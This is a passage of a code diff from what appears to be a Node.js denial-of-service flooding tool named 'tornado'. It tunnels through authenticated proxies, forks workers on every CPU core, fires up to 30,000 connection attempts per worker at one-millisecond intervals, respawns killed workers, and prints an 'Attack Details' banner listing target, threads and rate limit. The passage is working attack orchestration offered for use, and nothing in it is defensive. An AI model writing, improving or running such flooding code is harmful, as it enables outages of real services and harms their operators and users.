+            netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Authorization: Basic ${authString}\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
+        }
+    }).once('error', () => { }).once('close', () => {
+        if (tlsSocket) {
+            tlsSocket.end(() => tlsSocket.destroy());
+            go();
+        }
+    });
 }
-
 
 
 if (cluster.isMaster) {
-     const workers = {}
+    const workers = {};
 
-     Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
+    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }))
+    console.log(`
 
-     // cluster.on('exit', (worker) => {
-     //     cluster.fork({ core: worker.id % os.cpus().length });
-     // });
+             *     ,MMM8&&&.            *
+                  MMMM88&&&&&    .
+                 MMMM88&&&&&&&
+     *           MMM88&&&&&&&&
+                 MMM88&&&&&&&&
+                 'MMM88&&&&&&'
+                   'MMM8&&&'      *
+          |\___/|
+          )     (             .              '
+         =\     /=
+           )===(       *
+          /     \
+          |     |
+         /       \
+         \       /
+  _/\_/\_/\__  _/_/\_/\_/\_/\_/\_/\_/\_/\_/\_
+  |  |  |  |( (  |  |  |  |  |  |  |  |  |  |
+  |  |  |  | ) ) |  |  |  |  |  |  |  |  |  |
+  |  |  |  |(_(  |  |  |  |  |  |  |  |  |  |
+  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |
+  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |
 
-     cluster.on('message', (worker, message) => {
-          workers[worker.id] = [worker, message]
-     })
+> Attack Details:   
+> Version: [tornado - ${ver}]
+> ${Date().toLocaleString("us")}
+> Request Method: [${reqmethod}]
+> Target: [${target}]
+> Time: [${time} sec]
+> Threads: [${threads}x core]
+> Ratelimit: [${ratelimit} rq/s]
+`)
 
-     if (enabled('debug')) {
-          setInterval(() => {
-               let statuses = {}
-               for (let w in workers) {
-                    if (workers[w][0].state == 'online') {
-                         for (let st of workers[w][1]) {
-                              for (let code in st) {
-                                   if (statuses[code] == null)
-                                        statuses[code] = 0
+    function shutdownCluster() {
+        const workerIds = Object.keys(cluster.workers);
 
-                                   statuses[code] += st[code]
-                              }
-                         }
+        workerIds.forEach((id) => {
+            if (cluster.workers[id]) {
+                cluster.workers[id].on('exit', () => {
+                    if (Object.keys(cluster.workers).length === 0) {
+                        process.exit();
                     }
-               }
-               let d = new Date();
-               let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
-               let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
-               let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();
-               console.log(`${hours}:${minutes}:${seconds} `, statuses);
-          }, 1000)
-     }
+                });
+                cluster.workers[id].kill('SIGTERM');
+            }
+        });
 
-     setTimeout(() => process.exit(1), time * 1000);
+        if (workerIds.length === 0) {
+            process.exit();
+        }
+    }
 
+    process.on('SIGINT', shutdownCluster);
+    process.on('SIGTERM', shutdownCluster);
+    process.on('SIGTSTP', () => {
+        shutdownCluster();
+    });
+
+    cluster.on('exit', (worker, code, signal) => {
+        if (signal !== 'SIGTERM' && signal !== 'SIGINT' && signal !== 'SIGTSTP') {
+            cluster.fork({ core: worker.id % os.cpus().length });
+        }
+    });
+
+    cluster.on("message", (worker, message) => {
+        workers[worker.id] = [worker, message];
+    });
+
+    if (debugMode) {
+        setInterval(() => {
+            let statuses = {};
+            for (let w in workers) {
+                if (workers[w][0].state === "online") {
+                    for (let st of workers[w][1]) {
+                        for (let code in st) {
+                            if (!statuses[code]) statuses[code] = 0;
+                            statuses[code] += st[code];
+                        }
+                    }
+                }
+            }
+            console.clear();
+            console.log(new Date().toLocaleString("us"), statuses);
+        }, 1000);
+    }
+
+    setTimeout(() => process.exit(1), time * 1000);
+    setTimeout(() => exit(), time * 1000);
 } else {
-     setInterval(() => { go() });
-     if (enabled('debug')) {
-          setInterval(() => {
-               if (statusesQ.length >= 4)
-                    statusesQ.shift()
+    let conns = 0;
 
-               statusesQ.push(statuses)
-               statuses = {}
-               process.send(statusesQ)
-          }, 250)
-     }
-     setTimeout(() => process.exit(1), time * 1000);
+    let i = setInterval(() => {
+        if (conns < 30000) {
+            conns++;
+        } else {
+            clearInterval(i);
+            return;
+        }
+        go();
+    }, 1);
+
+    if (debugMode) {
+        setInterval(() => {
+            if (statusesQ.length >= 4) statusesQ.shift();
+            statusesQ.push(statuses);
+            statuses = {};
+            if (process.connected) {
+                process.send(statusesQ);
+            }
+        }, 250);
+    }
+
+    setTimeout(() => process.exit(1), time * 1000);
+    setTimeout(() => exit(), time * 1000);
+
+    process.on('SIGINT', cleanupAndExit);
+    process.on('SIGTERM', cleanupAndExit);
+    process.on('SIGTSTP', cleanupAndExit);
+
+    function cleanupAndExit() {
+        clearInterval(i);
+        process.exit();
+    }
 }
